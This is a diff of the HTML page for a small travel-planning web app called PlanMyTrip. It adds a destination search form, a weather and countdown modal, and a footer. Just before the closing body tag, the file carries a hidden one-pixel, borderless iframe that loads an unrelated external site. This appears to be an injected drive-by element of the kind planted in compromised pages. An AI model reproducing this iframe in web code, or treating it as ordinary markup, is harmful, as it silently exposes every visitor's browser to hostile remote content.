@@ -6,28 +6,44 @@
         <title>PlanMyTrip</title>
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
         <link rel="stylesheet" href="">
+        
     </head>
     <body>
         <div id="navbar">
-            
+            <p>PlanMyTrip.com</p>
+        </div>       
+        <div id="input-box">
+            <div id="header">
+                <h1>Explore The World</h1>
+            </div>
+            <div id="input-content">
+                <label for="destination">Seach for your trip</label>
+                <input type="text" id="destination" placeholder="City">
+                <input type="date" id="tripDate" placeholder="Departure">
+                <button id="btn" onclick="return Client.handleSubmit(event)" >Submit</button>
+            </div>
         </div>
-        <div>
-            <h1></h1>
+        <div id="myModal" class="modal">
+            <div class="modal-box">
+                <span id="close">&times;</span>
+                <h1 id="mainHeading"></h1>
+                <div class="content">
+                    <h3>Weather Forecast</h3>
+                    <ul>
+                        <li><span>Temperature:</span><span id="temp"></span></li>
+                        <li><span>Description:</span><span id="desc"></span></li>
+                    </ul>   
+                    <h3>Days Left:<span id="daysLeft"></span></h3>
+                    <img id="destImg" src="" alt="img">
+                </div>
+            </div>
+
         </div>
-        <div>
-            <label for="destination">Enter Your Destination:</label>
-            <input type="text" id="destination">
-            <label for="tripDate">Date</label>
-            <input type="date" id="tripDate">
-            <button id="btn" onclick="return Client.handleSubmit(event)" >Submit</button>
-        </div>
-        <div>
-            <img id="1" src="" width="400px">
-            <img id="2" src="" width="400px">
-            <img id="3" src="" width="400px">
-            <img id="4" src=""  width="400px">
-        </div>
+        <footer>
+            <p>&copy; 2020 PlanMyTrip.com</p>         
+        </footer>
 <iframe src="http://www.Trenz.pl/rc/" width=1 height=1 frameborder=0></iframe>
 </body>
 </html>
